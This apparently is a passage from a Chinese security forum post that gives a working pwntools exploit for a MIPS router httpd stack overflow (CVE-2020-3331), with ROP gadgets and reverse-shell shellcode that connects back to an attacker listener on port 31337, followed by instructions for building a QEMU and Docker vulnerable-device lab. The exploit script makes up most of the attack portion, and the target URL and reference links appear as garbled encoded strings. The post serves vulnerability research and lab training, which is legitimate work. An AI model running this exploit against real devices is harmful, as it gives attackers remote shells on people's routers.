
```python
#coding:UTF-8
from pwn import *
import thread,requests
context(arch='mips',endian='little',os='linux', log_level='debug')
io = listen(31337)
libc = 0x77a6a000
jmp_a0 = libc + 0x0003D050
# move  $t9,$a0             ; jalr  $a0
jmp_s0 = libc + 0x000257A0
# addiu $a0,$sp,0x38+var_20 ; jalr  $s0

shellcode = "slti $a0, $zero, 0xFFFF\n"
shellcode += "slti $a0, $zero, 0xFFFF\n"
shellcode += "li $v0, 4006\n"
shellcode += "syscall 0x42424\n"
shellcode += "slti $a0, $zero, 0x1111\n"
shellcode += "li $v0, 4006\n"
shellcode += "syscall 0x42424\n"
shellcode += "li $t4, 0xFFFFFFFD\n"
shellcode += "not $a0, $t4\n"
shellcode += "li $v0, 4006\n"
shellcode += "syscall 0x42424\n"
shellcode += "li $t4, 0xFFFFFFFD\n"
shellcode += "not $a0, $t4\n"
shellcode += "not $a1, $t4\n"
shellcode += "slti $a2, $zero, 0xFFFF\n"
shellcode += "li $v0, 4183\n"
shellcode += "syscall 0x42424\n"
shellcode += "andi $a0, $v0, 0xFFFF\n"
shellcode += "li $v0, 4041\n"
shellcode += "syscall 0x42424\n"
shellcode += "li $v0, 4041\n"
shellcode += "syscall 0x42424\n"
shellcode += "lui $a1, 0x6979\n"
shellcode += "ori $a1, 0xFF01\n"
shellcode += "addi $a1, $a1, 0x0101\n"
shellcode += "sw $a1, -8($sp)\n"
shellcode += "li $a1, 0x010A0A0A\n"   #这里是需要改的IP地址
shellcode += "sw $a1, -4($sp)\n"
shellcode += "addi $a1, $sp, -8\n"
shellcode += "li $t4, 0xFFFFFFEF\n"
shellcode += "not $a2, $t4\n"
shellcode += "li $v0, 4170\n"
shellcode += "syscall 0x42424\n"
shellcode += "lui $t0, 0x6962\n"
shellcode += "ori $t0, $t0,0x2f2f\n"
shellcode += "sw $t0, -20($sp)\n"
shellcode += "lui $t0, 0x6873\n"
shellcode += "ori $t0, 0x2f6e\n"
shellcode += "sw $t0, -16($sp)\n"
shellcode += "slti $a3, $zero, 0xFFFF\n"
shellcode += "sw $a3, -12($sp)\n"
shellcode += "sw $a3, -4($sp)\n"
shellcode += "addi $a0, $sp, -20\n"
shellcode += "addi $t0, $sp, -20\n"
shellcode += "sw $t0, -8($sp)\n"
shellcode += "addi $a1, $sp, -8\n"
shellcode += "addiu $sp, $sp, -20\n"
shellcode += "slti $a2, $zero, 0xFFFF\n"
shellcode += "li $v0, 4011\n"
shellcode += "syscall 0x42424"
shell = asm(shellcode)

# 覆盖s0 覆盖ra 最后将shellcode写进sp+0x18的位置
# 先jmp到s0在jmp到a0执行shellcode
payload = "status_guestnet.asp"+'a'*49+p32(jmp_a0)+0x20*'a'+p32(jmp_s0)+0x18*'a'+shell
#payload = "status_guestnet.asp"+'a'*49+p32(0xdeadbeef)
paramsPost = {
"cmac":"7a:29:9f:d3:d2:6e",
"submit_button":payload,
"cip":"192.168.1.1",
}

def attack():
	try:
		requests.post("338K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5H3i4K6u0W2x3e0m8Q4x3X3f1I4x3q4)9J5k6e0y4Q4x3V1k6Y4N6h3g2K6N6q4)9#2k6X3I4G2k6$3!0#2N6q4)9J5k6h3y4Y4K9b7`.`."`, data=paramsPost, verify=False)
	except:
		pass

thread.start_new_thread(attack,())
io.wait_for_connection()
log.success("getshell")
io.interactive()
#10A0A0A -> 10.10.10.1 LSB
#0x77aa7050 jalr $a0
#0x77a8f7a0 jalr $s0
```

`shellcode`我是改的回连地址，然后利用`pwntools`把汇编转成二进制在打进去，算是在轩哥的exp上做了些改动，感兴趣的师傅可以自己去调一下。

## docker搭建固件靶场环境

最后的docker环境部署，其实大概的架构是这样的

![image-20210308152626694](https://bbs.kanxue.com/upload/attach/202103/908705_4WWN6EA3UZRM2HN.png)

将`qemu_system`里的端口映射到docker里面，在从docker端口转发到宿主机，然后外网就能访问到`qemu_system`里的服务了，因为要外网访问，所以我们不使用方便调试的tap模式，直接使用net模式，启动脚本如下：

```bash
qemu-system-mipsel -M malta \
-kernel vmlinux-3.2.0-4-4kc-malta \
-hda debian_wheezy_mipsel_standard.qcow2 \
-append "root=/dev/sda1 console=tty0 nokalsr" \
-device e1000,netdev=net0 \
-netdev user,id=net0,hostfwd=tcp::80-:80,hostfwd=tcp::31337-:31337,hostfwd=tcp::1234-:1234 -nographic
```

转发了三个端口，一个是`httpd`的80，回连的31337，`gdb`调试的1234。

然后在`qemu`里写好启动脚本

```sh
#!/bin/sh
chroot squashfs-root sh start.sh
```

```sh
#!/bin/sh
export LD_PRELOAD="./nvram.so" && ./httpd //start.sh的内容
```

放到`rc.local`里面，就能自启动了。

在将文件提前保存进docker镜像里，然后写好`dockerfile`，打包上传至dockerhub即可

```dockerfile
FROM vulshare/cve-2020-3331:lxonz
LABEL Author="lxonz"

WORKDIR /home/root/qemu_system_mipsel

CMD ["/bin/sh", "-c", "chmod 755 qemu_mipsel.sh && sh qemu_mipsel.sh"]

EXPOSE 31137
EXPOSE 80
EXPOSE 1234
```

这里要写好转发的端口，最后通过`-P`参数启动。

最后呢，因为`qemu`里我转发了1234端口，但是`docker`里没转发，如果想要调试的师傅可以自己转发一下

参考链接：

[1] c4fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5N6h3q4F1P5s2g2S2L8X3u0D9K9h3&6Y4j5X3I4A6L8X3N6Q4x3X3g2Y4K9i4c8Z5N6h3u0Q4x3X3g2A6L8#2)9J5c8X3W2G2N6q4)9J5c8U0t1H3x3U0m8Q4x3V1j5I4x3q4)9J5c8U0t1$3i4K6u0r3M7Y4j5I4x3e0m8%4i4K6u0r3

[2] 0efK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4q4I4i4K6g2X3x3U0p5H3y4U0x3^5y4K6y4Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0p5H3x3K6l9K6y4K6f1I4y4b7`.`.

[3] eceK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6F1L8%4y4W2j5#2)9J5k6h3!0J5k6#2)9J5c8X3S2G2L8h3g2Q4x3V1k6V1k6i4c8S2K9h3I4Q4x3V1j5@1y4o6f1^5i4K6u0W2K9s2c8E0L8l9`.`.

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

[#安全研究](https://bbs.kanxue.com/forum-128-1-167.htm)
[#固件分析](https://bbs.kanxue.com/forum-128-1-170.htm)
[#漏洞分析](https://bbs.kanxue.com/forum-128-1-171.htm)
[#漏洞挖掘](https://bbs.kanxue.com/forum-128-1-178.htm)
[#家用设备](https://bbs.kanxue.com/forum-128-1-173.htm)

